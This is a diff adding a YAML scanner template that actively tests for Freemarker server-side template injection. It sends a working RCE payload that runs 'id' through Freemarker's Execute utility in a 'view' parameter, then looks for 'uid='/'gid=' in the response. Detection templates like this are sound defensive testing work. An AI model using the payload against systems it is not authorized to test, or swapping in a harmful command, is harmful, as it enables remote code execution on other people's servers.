@@ -1,0 +1,22 @@
+id: patt-ssti-freemarker-01-view
+name: 'PATT ssti patt-ssti-freemarker-01 via view'
+severity: critical
+type: active
+tags:
+  - ssti
+  - patt
+requires:
+  - java
+description: 'PATT Freemarker RCE via Execute utility. [patt:patt-ssti-freemarker-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Java.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      view:
+        - '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
